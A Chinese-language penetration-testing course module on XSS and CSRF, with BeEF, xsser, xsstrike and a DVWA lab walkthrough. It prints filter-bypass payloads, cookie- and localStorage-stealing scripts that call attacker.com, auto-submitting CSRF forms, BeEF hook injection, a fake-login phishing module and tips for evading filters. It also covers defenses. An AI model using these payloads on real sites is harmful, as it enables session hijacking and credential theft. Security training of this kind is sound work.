@@ -1,0 +1,665 @@
+================================================================================
+模块 05：XSS与CSRF攻击
+================================================================================
+模块标题：客户端攻防 — XSS跨站脚本与CSRF跨站请求伪造
+学习目标：
+  1. 理解XSS的三种类型 (反射型/存储型/DOM型) 及原理
+  2. 熟练使用beef框架进行浏览器控制
+  3. 掌握xsser和xsstrike进行XSS自动化扫描
+  4. 理解CSRF攻击原理和利用方法
+  5. 掌握csrftester的使用
+  6. 能在DVWA和实际环境中进行XSS漏洞利用
+工具分类：XSS/CSRF客户端攻击工具
+推荐工具：beef (核心), xsser, xsstrike, csrftester
+优先级：★★★★★ (OWASP Top 10, 最常见的Web漏洞之一)
+================================================================================
+
+============================================================
+第一部分：XSS跨站脚本攻击原理
+============================================================
+
+【1.1 什么是XSS】
+
+跨站脚本攻击 (Cross-Site Scripting, XSS) 是指攻击者将恶意
+JavaScript代码注入到目标网站的页面中，当其他用户浏览该页面时，
+恶意代码在用户浏览器中执行，从而窃取信息或执行操作。
+
+为什么叫"XSS"而不是"CSS"？
+  因为CSS已被Cascading Style Sheets(层叠样式表)占用。
+
+【1.2 XSS的危害 (攻击者视角)**
+
+攻击者通过XSS可以实现：
+  ✓ 窃取用户Cookie (未设HttpOnly时) → 会话劫持
+  ✓ 窃取用户输入的敏感信息 (键盘记录)
+  ✓ 篡改页面内容 (钓鱼)
+  ✓ 重定向到恶意网站
+  ✓ 利用浏览器漏洞进行进一步攻击
+  ✓ 通过beef完全控制受害者浏览器
+  ✓ 对内网进行扫描和攻击 (浏览器代理)
+  ✓ 窃取LocalStorage/SessionStorage中的数据
+  ✓ 自动执行操作 (转账、发帖、修改设置)
+  ✓ 获取用户的地理位置、摄像头/麦克风(需授权)
+
+【1.3 XSS三种类型】
+
+类型1: 反射型XSS (Reflected XSS)
+────────────────────────────────
+  恶意脚本通过URL参数传入，服务器将其直接反映在响应页面中。
+  需要受害者点击特制的恶意链接。
+  
+  示例场景:
+  搜索页面: /search.php?q=<script>alert('XSS')</script>
+  服务器代码: echo "搜索结果: " . $_GET['q'];
+  结果: 页面直接输出<script>标签，JS被执行
+  
+  特点: 一次性触发、需要用户点击链接、最常见
+
+类型2: 存储型XSS (Stored XSS)
+────────────────────────────────
+  恶意脚本被永久存储在服务器上 (数据库、文件、日志等)，
+  每当用户访问受影响的页面时脚本就会执行。
+  
+  示例场景:
+  留言板: 提交留言内容为 <script>alert('XSS')</script>
+  服务器将留言存入数据库
+  其他用户访问留言板时，恶意代码被执行
+  
+  特点: 持久化、危害最大、影响所有访问者
+
+类型3: DOM型XSS (DOM-based XSS)
+────────────────────────────────
+  漏洞存在于客户端JavaScript中，恶意脚本通过DOM操作注入。
+  服务器响应本身不包含恶意脚本。
+  
+  示例场景:
+  页面JS: document.write("Hello " + location.hash.substring(1));
+  URL: /page.html#<img/src=x onerror=alert(1)>
+  服务器响应不包含XSS，但客户端JS将hash写入DOM时触发了XSS
+  
+  特点: 完全客户端、难以检测、传统扫描器常漏报
+
+【1.4 XSS利用向量 (Payload)】
+
+基础测试:
+  <script>alert(1)</script>
+  <script>alert('XSS')</script>
+  <script>prompt('XSS')</script>
+  <script>confirm('XSS')</script>
+
+绕过简单过滤:
+  <scr<script>ipt>alert(1)</scr</script>ipt>
+  <SCRIPT>alert(1)</SCRIPT>                      → 大小写
+  <script>alert(1)</script>                      → HTML实体编码
+  <img src=x onerror=alert(1)>                   → 不使用script标签
+  <body onload=alert(1)>
+  <svg onload=alert(1)>
+  <input onfocus=alert(1) autofocus>
+  <video><source onerror=alert(1)>
+  <marquee onstart=alert(1)>
+  <details open ontoggle=alert(1)>
+
+编码绕过:
+  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;1&#41;">
+  <a href="javascript:alert(1)">click</a>
+  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;
+           &#112;&#116;&#58;alert(1)">click</a>
+
+高级Paylaod (窃取Cookie):
+  <script>
+  var img = new Image();
+  img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
+  </script>
+
+高级Paylaod (窃取LocalStorage):
+  <script>
+  new Image().src = "http://attacker.com/log?" + 
+    encodeURIComponent(JSON.stringify(localStorage));
+  </script>
+
+高级Payload (模拟操作):
+  <script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', '/change_password.php', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send('new_password=hacked&confirm_password=hacked');
+  </script>
+
+============================================================
+第二部分：beef — 浏览器利用框架
+============================================================
+
+【2.1 beef简介】
+
+BeEF (Browser Exploitation Framework) 是一个专注于Web浏览器
+的攻击框架。通过注入一段JavaScript Hook代码，攻击者可以对
+被Hook的浏览器执行各种攻击模块。
+
+核心概念:
+  - Hook: 注入到目标浏览器的一段JavaScript代码
+  - Zombie: 被Hook的浏览器
+  - Panel: 攻击者的管理界面
+  - Module: 对Zombie执行的具体攻击模块
+
+架构:
+  攻击者 → BeEF Panel (UI) → BeEF Server → Hook.js → Zombie浏览器
+
+【2.2 启动beef】
+
+Step 1: 启动BeEF
+  终端输入: sudo beef-xss
+
+  首次启动可能需要设置新密码:
+  Enter new BeEF password: beef
+  Confirm new BeEF password: beef
+
+  启动输出示例:
+  [*] Browser Exploitation Framework (BeEF) 0.5.0.0
+  [*] Project: http://beefproject.com
+  [*] BeEF is loading. Wait a few seconds...
+  [*] 10 extensions enabled
+  [*] 473 modules enabled
+  [*] 1 network interfaces were detected
+  [*] running on network interface: 127.0.0.1
+  [*] Hook URL: http://<IP>:3000/hook.js
+  [*] UI URL:   http://<IP>:3000/ui/panel
+  [+] running on http://0.0.0.0:3000/
+
+Step 2: 访问BeEF控制面板
+  打开Firefox
+  地址栏输入: http://localhost:3000/ui/panel
+  (如果远程访问，使用: http://<攻击机IP>:3000/ui/panel)
+
+Step 3: 登录BeEF
+  Username: beef
+  Password: beef (或你设的密码)
+  登录后看到BeEF主面板
+
+【2.3 BeEF界面详解】
+
+登录后的左侧面板:
+  - Getting Started: 新手引导
+  - Hooked Browsers: 已Hook的浏览器列表
+  - Logs: 日志面板 → 分为Browser, Server, Client
+  - Zombees: 僵尸浏览器管理
+
+Hooked Browsers面板显示:
+  - Online Browsers: 在线僵尸 (绿色)
+  - Offline Browsers: 离线僵尸 (灰色)
+  - 每个Zombie显示: IP、浏览器类型、OS、被Hook的页面
+
+点击某个Zombie后:
+  - Details标签: 浏览器详情
+    → Browser: Firefox 128.0
+    → OS: Linux x86_64
+    → Hardware: CPU核心数, 屏幕分辨率
+    → Components: Flash, Java, ActiveX, WebRTC, etc.
+    → Window Size: 窗口大小
+    → Cookies: 该域的Cookie
+    → Page Title / URI
+  
+  - Logs标签: 该Zombie的操作日志
+  
+  - Commands标签: 可执行的攻击模块 ⬅ 核心！
+
+【2.4 BeEF攻击模块使用】
+
+模块分类:
+  - Browser: 浏览器信息、Hook维持
+  - Chrome Extensions: Chrome扩展攻击
+  - Debug: 调试模块
+  - Exploits: 浏览器漏洞利用
+  - Host: 主机信息获取
+  - IPEC: 进程间通信
+  - Metasploit: 与Metasploit联动
+  - Misc: 杂项 (弹窗、重定向等)
+  - Network: 网络扫描、端口扫描
+  - Persistence: 持久化维持
+  - Phonegap: 移动应用攻击
+  - Social Engineering: 社会工程学
+
+常用模块示例:
+
+Module 01: 获取Cookie (Browser → Get Cookie)
+  右键 → Execute
+  结果: 返回当前域的Cookie
+
+Module 02: 获取页面HTML (Browser → Get Page HTML)
+  右键 → Execute
+  结果: 返回当前页面的完整HTML
+
+Module 03: 弹出假登录框 (Social Engineering → Pretty Theft)
+  设置: Dialog Type → Facebook Login
+  结果: 用户浏览器弹出假Facebook登录框，窃取凭证
+
+Module 04: 重定向浏览器 (Browser → Redirect Browser)
+  设置: Redirect URL → http://phishing-site.com
+  结果: 用户被重定向到钓鱼页面
+
+Module 05: 获取浏览器指纹 (Host → Detect Software)
+  右键 → Execute
+  结果: 获取目标操作系统、浏览器、插件等详细信息
+
+Module 06: 内网扫描 (Network → Detect Internal IP)
+  右键 → Execute
+  结果: 获取用户的内网IP (WebRTC泄露)
+
+Module 07: 端口扫描 (Network → Port Scanner)
+  设置: IPs → 192.168.1.1-192.168.1.254, Ports → 80,443,22,3306
+  结果: 通过浏览器扫描内网端口
+
+Module 08: 浏览器持久化 (Persistence → Confirm Close Tab)
+  右键 → Execute
+  结果: 用户关闭标签页时弹出确认框
+
+Module 09: 获取剪贴板 (Host → Get Clipboard)
+  右键 → Execute
+  结果: 读取用户剪贴板内容 (需权限)
+
+Module 10: 摄像头/麦克风 (Misc → Webcam)
+  右键 → Execute
+  结果: 获取用户摄像头权限提示
+
+【2.5 注入Hook的方法】
+
+方法1: 直接注入到存在XSS的页面
+  在XSS测试点注入:
+  <script src="http://<攻击机IP>:3000/hook.js"></script>
+
+方法2: 使用BeEF的Web界面注入
+  BeEF Panel → Hooked Browsers → 搜索框旁有个 "Inject" 按钮
+
+方法3: 通过XSS漏洞自动传播
+
+方法4: 结合其他漏洞 (如LFI包含远程JS)
+
+方法5: 物理访问时使用浏览器书签
+
+【2.6 BeEF与Metasploit联动】
+
+1. 启动Metasploit: msfconsole
+2. 加载BeEF扩展:
+   load beef-xss
+3. Metasploit中可以直接控制BeEF的Zombies
+4. 使用browser_autopwn模块自动攻击Zombie浏览器
+
+============================================================
+第三部分：xsser — XSS自动化扫描
+============================================================
+
+【3.1 xsser简介】
+
+xsser (Cross-Site Scripter) 是XSS自动化检测和利用工具。
+支持GET/POST参数测试，包含大量预定义payload。
+
+【3.2 基本使用】
+
+# 基本扫描
+xsser --url "http://example.com/search.php?q=XSS"
+
+# 自动模式 (尝试所有参数)
+xsser --url "http://example.com/search.php?q=test" --auto
+
+【3.3 命令详解】
+
+# 指定注入参数
+xsser --url "http://example.com/page.php" -p "search"
+
+# 对POST请求测试
+xsser --url "http://example.com/login.php" \
+      -p "username" \
+      --data="password=test"
+
+# 使用代理
+xsser --url "http://example.com/" --proxy "http://127.0.0.1:8080"
+
+# 携带Cookie
+xsser --url "http://example.com/" --cookie="PHPSESSID=abc123"
+
+# 自定义User-Agent
+xsser --url "http://example.com/" --user-agent="Custom/1.0"
+
+# 使用GET请求
+xsser --url "http://example.com/search.php?q=test" --auto --get
+
+# 使用POST请求
+xsser --url "http://example.com/search.php" -p "q" --post
+
+# 选择攻击向量
+xsser --url "URL" --auto --Css             → CSS注入
+xsser --url "URL" --auto --Xsa             → XSS代理
+xsser --url "URL" --auto --Xsr             → XSS反射
+xsser --url "URL" --auto --Xss             → XSS存储
+
+# 编码绕过
+xsser --url "URL" --auto --Hex             → Hex编码
+xsser --url "URL" --auto --Str             → 字符串编码
+xsser --url "URL" --auto --Une             → Unicode编码
+
+# 使用特定payload列表
+xsser --url "URL" --auto --payload "STRING"
+
+# 设置输出文件
+xsser --url "URL" --auto --output report
+
+# DropCookie (如发现XSS, 设置一个cookie确认)
+xsser --url "URL" --auto --Dcp "XSSVULN=1"
+
+# 最终攻击向量 (获取实际利用代码)
+xsser --url "URL" --auto --Fp "http://attacker.com/log?
+
+【3.4 典型扫描示例】
+
+# 全面自动扫描
+xsser -u "http://testphp.vulnweb.com/search.php?test=query" --auto
+
+# 自定义payload的POST扫描
+xsser -u "http://example.com/guestbook.php" \
+      -p "name,message" \
+      --post \
+      --data="email=test@test.com&submit=Submit"
+
+============================================================
+第四部分：xsstrike — 高级XSS检测
+============================================================
+
+【4.1 xsstrike简介】
+
+xsstrike是一个高级的XSS检测套件，特点：
+  - 智能爬虫
+  - 基于浏览器的payload测试 (使用headless)
+  - 强大的payload生成器
+  - WAF检测
+  - DOM XSS检测
+  - 模糊测试引擎
+
+【4.2 基本使用】
+
+# 基本扫描
+xsstrike -u "http://example.com/page.php?param=test"
+
+# 扫描特定参数
+xsstrike -u "http://example.com/page.php" --params "search,q"
+
+# POST请求
+xsstrike -u "http://example.com/login" --data "username=admin&password=123"
+
+# 爬取并扫描
+xsstrike -u "http://example.com" --crawl
+
+# 携带cookie
+xsstrike -u "http://example.com/page.php?param=test" \
+         --headers "Cookie: PHPSESSID=abc123"
+
+# 跳过确认提示
+xsstrike -u "URL" --console-log-level DEBUG
+
+# 文件上传XSS测试
+xsstrike -u "http://example.com/upload" --path /path/to/file
+
+# 盲XSS
+xsstrike -u "URL" --blind http://your-callback-server.com
+
+【4.3 xsstrike特色功能】
+
+WAF检测:
+  xsstrike会自动检测WAF并尝试自适应绕过，这是xsstrike区别于
+  其他XSS工具的核心竞争力。
+
+Payload生成:
+  基于上下文分析的payload生成，不是简单使用预定义列表。
+  
+  语法分析:
+  分析反射上下文 (HTML标签内、属性内、JavaScript内等)，
+  生成针对性的payload。
+
+DOM XSS检测:
+  使用headless浏览器 (如PhantomJS) 执行页面JS代码，
+  检测DOM层面的XSS漏洞。
+
+============================================================
+第五部分：CSRF跨站请求伪造
+============================================================
+
+【5.1 CSRF攻击原理】
+
+CSRF (Cross-Site Request Forgery) 跨站请求伪造，利用已认证
+用户的身份，在用户不知情的情况下发送恶意请求。
+
+攻击条件:
+  1. 用户在目标网站A已登录 (有有效Cookie)
+  2. 用户访问了恶意网站B
+  3. 网站B包含指向网站A的请求 (如修改密码的表单)
+  4. 浏览器自动携带网站A的Cookie
+  5. 请求成功执行
+
+经典攻击场景:
+  受害者登录了 bank.com (Cookie中有认证信息)
+  受害者访问了 attacker.com
+  attacker.com页面包含:
+    <img src="http://bank.com/transfer?to=attacker&amount=10000">
+  浏览器自动向bank.com发送GET请求，并携带Cookie
+  转账成功 (如果bank.com没有CSRF防护)
+
+【5.2 CSRF攻击payload示例】
+
+GET方式:
+  <img src="http://target.com/change_email.php?email=attacker@evil.com">
+  <script src="http://target.com/delete_account.php">
+
+POST方式 (自提交表单):
+  <html>
+  <body>
+    <form action="http://target.com/change_password.php" 
+          method="POST" id="csrf_form">
+      <input type="hidden" name="new_password" value="hacked123">
+      <input type="hidden" name="confirm_password" value="hacked123">
+    </form>
+    <script>document.getElementById('csrf_form').submit();</script>
+  </body>
+  </html>
+
+AJAX方式 (JSON CSRF):
+  <script>
+  fetch('http://target.com/api/update_profile', {
+    method: 'PUT',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({email: 'attacker@evil.com'})
+  });
+  </script>
+
+【5.3 csrftester — CSRF检测工具】
+
+csrftester是专门用于检测CSRF漏洞的工具。
+
+# 基本使用
+csrftester -u http://example.com
+
+# 指定目标页面
+csrftester -u http://example.com/change_password.php
+
+# csrftester检测原理:
+  1. 录制正常用户的操作流程
+  2. 分析请求中是否包含不可预测的token
+  3. 如果没有token，生成CSRF攻击POC
+  4. 验证攻击POC是否有效
+
+# 工作流程:
+Step 1: 启动csrftester (默认监听8008端口)
+Step 2: 配置浏览器代理: 127.0.0.1:8008
+Step 3: 正常浏览目标网站并执行操作
+Step 4: csrftester录制操作并分析
+Step 5: 生成CSRF POC
+
+【5.4 CSRF防御方法】
+
+从攻击者视角了解防御，有助于寻找绕过:
+  1. CSRF Token: 每个表单/请求附加随机令牌
+     → 绕过：窃取Token (如果有XSS)，Token可预测
+  2. SameSite Cookie: SameSite=Strict/Lax
+     → 绕过：SameSite=None时可正常攻击
+  3. Referer/Origin检查
+     → 绕过：空Referer (某些浏览器配置)，Referer头可被修改
+  4. 自定义请求头: X-Requested-With: XMLHttpRequest
+     → 绕过：Flash利用，CORS配置错误
+  5. 二次确认: 输入当前密码
+     → 绕过：无法绕过(除非同时有XSS钓鱼)
+
+============================================================
+第六部分：DVWA XSS + BeEF实战演练
+============================================================
+
+【完整实战: 从XSS漏洞到浏览器完全控制】
+
+预设: DVWA运行中，security = low
+
+Step 1: 终端启动BeEF
+  打开终端
+  输入: sudo beef-xss
+  
+  等待启动完成，记录Hook URL:
+  Hook URL: http://<攻击机IP>:3000/hook.js
+  例如: http://192.168.1.100:3000/hook.js
+
+Step 2: 打开BeEF控制面板
+  打开Firefox新标签页
+  访问: http://localhost:3000/ui/panel
+  用户名: beef
+  密码: beef
+  登录后保持此面板打开
+
+Step 3: 访问DVWA的XSS (Reflected) 页面
+  打开Firefox另一个标签页
+  访问: http://dvwa.local/login.php
+  登录: admin / password
+  设置security: low
+  左侧菜单点击: XSS (Reflected)
+
+Step 4: 测试基本的XSS
+  在输入框输入: <script>alert(1)</script>
+  点击 Submit
+  观察: 弹出alert对话框 → XSS确认成功！
+
+Step 5: 注入BeEF Hook
+  在输入框输入:
+  <script src="http://192.168.1.100:3000/hook.js"></script>
+  
+  (将IP替换为你的实际IP)
+  
+  点击 Submit
+
+Step 6: 观察BeEF面板
+  切换到BeEF面板标签页
+  在 "Hooked Browsers" 面板中观察
+  应该看到一个新的Zombie出现
+  → 显示: 浏览器类型、IP、被Hook的页面
+
+Step 7: 探索被Hook的浏览器
+  点击新出现的Zombie
+  查看 Details 标签:
+    - Browser Name & Version
+    - Operating System
+    - Installed Plugins
+    - Cookies (窃取Cookie！)
+    - Page URI
+    - Screen Size
+
+Step 8: 执行BeEF模块 — 获取Cookie
+  在Commands标签中
+  展开 Browser → Get Cookie
+  点击 Execute
+  查看 Command results
+  应该能看到DVWA的所有Cookie
+
+Step 9: 执行BeEF模块 — 获取页面HTML
+  展开 Browser → Get Page HTML
+  点击 Execute
+  查看结果 → 获取到完整的DVWA页面HTML
+
+Step 10: 执行BeEF模块 — 弹窗测试
+  展开 Misc → Create Alert Dialog
+  设置: Alert text: "You have been hacked by BeEF!"
+  点击 Execute
+  回到DVWA标签页 → 看到弹出窗口
+
+Step 11: 执行BeEF模块 — 内网扫描
+  展开 Network → Detect Internal IP
+  点击 Execute
+  获取被Hook浏览器的内网IP (通过WebRTC泄露)
+
+Step 12: 测试存储型XSS
+  DVWA左侧菜单 → XSS (Stored)
+  在 Message 输入框输入:
+  <script src="http://192.168.1.100:3000/hook.js"></script>
+  在 Name 输入框输入: TestUser
+  点击 Sign Guestbook
+  每次任何人访问留言板，浏览器都会被Hook！
+
+Step 13: 社会工程学模块
+  展开 Social Engineering → Pretty Theft
+  设置:
+    Dialog Type: Facebook
+  点击 Execute
+  在DVWA标签页中会弹出假Facebook登录框
+  用户如果输入，凭证将被BeEF收集
+
+============================================================
+第七部分：XSS防御与修复
+============================================================
+
+【安全开发应对措施】
+
+  1. 输出编码:
+     htmlspecialchars($input, ENT_QUOTES, 'UTF-8');   // PHP
+     <c:out value="${input}"/>                          // JSP
+     {{ input }}                                        // Django/Angular自动转义
+
+  2. 内容安全策略 (CSP):
+     Content-Security-Policy: default-src 'self'; script-src 'self'
+     → 阻止内联脚本和外部脚本执行
+
+  3. HttpOnly Cookie:
+     Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
+     → 即使有XSS也无法通过document.cookie窃取
+
+  4. 输入验证: 白名单验证，拒绝危险标签
+
+  5. X-XSS-Protection: 1; mode=block
+     → 启用浏览器内置XSS过滤器 (旧版本浏览器)
+
+  6. DOM操作安全: 避免使用 innerHTML, document.write
+     使用 textContent, createElement 代替
+
+============================================================
+第八部分：实践注意事项
+
+⚠️  安全与法律提醒：
+  1. XSS测试和BeEF使用仅在授权环境进行
+  2. BeEF的某些模块可能触发杀软告警
+  3. 不要对公网目标注入Hook (除非有书面授权)
+  4. BeEF生成的payload可能被浏览器XSS过滤器拦截
+  5. 注意Hook代码的持久性: 存储型XSS > 反射型XSS
+  6. 社工模块的使用需格外谨慎
+
+🎯  实战技巧：
+  1. 遇到XSS过滤器 → 尝试编码/大小写/HTML5向量
+  2. HttpOnly导致无法读Cookie → 利用XSS做操作(改密码/发帖)
+  3. 反射型XSS需要社工 → 配合短链接服务
+  4. BeEF Hook被拦截 → 使用混淆/编码绕过
+  5. 结合XSS + CSRF → 使用XSS读取Token后转发CSRF请求
+
+================================================================================
+模块小结
+================================================================================
+
+完成本模块后你应该能够：
+  ✓ 识别和利用反射型、存储型、DOM型XSS漏洞
+  ✓ 熟练使用BeEF Framework进行浏览器控制
+  ✓ 使用xsser和xsstrike进行自动化XSS检测
+  ✓ 理解CSRF攻击原理和利用方法
+  ✓ 使用csrftester检测CSRF漏洞
+  ✓ 在DVWA中完成XSS+BeEF的完整攻击链
+  ✓ 了解XSS和CSRF的防御方法
+
+下一模块预告：06-文件包含与命令注入 — 使用commix和davtest等工具
